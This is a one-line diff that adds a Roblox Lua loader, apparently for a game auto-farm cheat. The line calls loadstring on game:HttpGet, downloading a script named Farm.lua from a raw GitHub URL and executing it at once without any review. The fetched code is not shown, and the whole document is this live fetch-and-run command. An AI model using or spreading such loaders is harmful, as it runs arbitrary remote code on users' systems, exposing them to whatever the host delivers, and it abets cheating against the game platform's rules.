@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Colato6/Prueba.1/refs/heads/main/Farm.lua'))()
